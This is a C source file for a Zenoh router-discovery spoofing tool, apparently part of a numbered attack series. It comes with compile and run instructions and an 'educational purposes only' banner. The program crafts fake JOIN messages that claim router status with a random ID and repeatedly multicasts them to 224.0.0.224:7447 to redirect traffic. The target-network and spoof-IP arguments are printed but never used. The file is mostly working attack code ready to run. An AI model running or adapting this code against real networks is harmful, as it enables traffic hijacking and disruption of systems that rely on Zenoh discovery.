/*
 * Attack 11: Router Discovery Spoofing
 * Announces fake routers to redirect traffic
 * 
 * Compile: gcc -o attack11_routerspoof attack_11_router_spoof.c -pthread
 * Run: ./attack11_routerspoof <target_network> <spoof_ip> <interval>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

#define Z_MSG_JOIN 0x03
#define Z_WHATAMI_ROUTER 0x01
#define MULTICAST_ADDR "224.0.0.224"
#define MULTICAST_PORT 7447

static volatile int g_running = 1;

void signal_handler(int sig) {
    printf("\n[!] Stopping router spoofing...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

void random_zid(unsigned char *zid) {
    for (int i = 0; i < 16; i++) {
        zid[i] = rand() % 256;
    }
}

size_t craft_fake_join(unsigned char *buffer, const unsigned char *zid) {
    size_t offset = 0;
    
    // JOIN header
    buffer[offset++] = Z_MSG_JOIN;
    
    // Version
    buffer[offset++] = 0x08;
    
    // WhatAmI (ROUTER) + ZID length
    buffer[offset++] = (Z_WHATAMI_ROUTER << 4) | 0x0F;
    
    // ZID (16 bytes)
    memcpy(buffer + offset, zid, 16);
    offset += 16;
    
    // Next SN reliable
    offset += encode_zint(buffer + offset, 1);
    
    // Next SN best effort
    offset += encode_zint(buffer + offset, 1);
    
    return offset;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_network> <spoof_ip> <interval_sec>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.255 192.168.1.100 5\n", argv[0]);
        return 1;
    }
    
    char *target_network = argv[1];
    char *spoof_ip = argv[2];
    int interval = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Router Discovery Spoofing          ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚══════════════════════════════════���═════════╝\n\n");
    printf("[*] Target network: %s\n", target_network);
    printf("[*] Spoofed IP: %s\n", spoof_ip);
    printf("[*] Announcement interval: %d seconds\n\n", interval);
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    // Create UDP socket for multicast
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return 1;
    }
    
    // Enable broadcast/multicast
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    
    struct sockaddr_in multicast_addr;
    memset(&multicast_addr, 0, sizeof(multicast_addr));
    multicast_addr.sin_family = AF_INET;
    multicast_addr.sin_port = htons(MULTICAST_PORT);
    inet_pton(AF_INET, MULTICAST_ADDR, &multicast_addr.sin_addr);
    
    unsigned char buffer[256];
    unsigned char zid[16];
    random_zid(zid);
    
    printf("[+] Announcing fake router with ZID: ");
    for (int i = 0; i < 16; i++) {
        printf("%02x", zid[i]);
    }
    printf("\n\n");
    
    unsigned long announcements = 0;
    
    while (g_running) {
        size_t msg_len = craft_fake_join(buffer, zid);
        
        ssize_t sent = sendto(sock, buffer, msg_len, 0,
                             (struct sockaddr*)&multicast_addr,
                             sizeof(multicast_addr));
        
        if (sent > 0) {
            announcements++;
            printf("[+] Sent fake JOIN announcement #%lu\n", announcements);
        } else {
            printf("[-] Send failed\n");
        }
        
        sleep(interval);
    }
    
    close(sock);
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Announcements: %-21lu ║\n", announcements);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}